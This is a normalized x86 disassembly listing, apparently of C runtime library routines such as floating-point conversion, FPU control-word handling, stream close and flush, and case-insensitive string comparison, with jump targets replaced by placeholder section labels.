mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1001daf3
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1002b058
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1002b0e6
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1002b186
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1002b058
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1002b0e6
push eax
mov [ ebp - 0xc ] eax
call sub_1002ba45
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1002b498
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_100274f0
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1001bddd
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1001bddd
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1002733b
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_100271c8
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_100272e5
pop ecx
test eax eax
jne r-xdata
call sub_1002733b
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_100271c8
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1002729c
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_100269e1
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1002b610
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1002b6a7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_100291f9
push esi
mov edi eax
call sub_1002bc54
push esi
call sub_100274f0
push eax
call sub_1002bb90
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_1001a3eb
and [ esi + 0x1c ] 0x0
pop ecx
sub_1002b714
push 0xc
push r--data
call sub_10020070
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10027412
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1002b6a7
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b780
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_100200b5
retn
mov eax [ ebp - 0x1c ]
sub_1002b788
push 0x10
push r--data
call sub_10020070
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001ea75
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_100200b5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10029055
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1001bddd
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10028fec
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002b859
mov eax [ ebp - 0x1c ]
call sub_1001bdf0
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1002b861
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
ja r-xdata
lea ecx [ ebx + 0x1 ]
xor edx edx
cmp ecx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov ecx [ eax ]
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
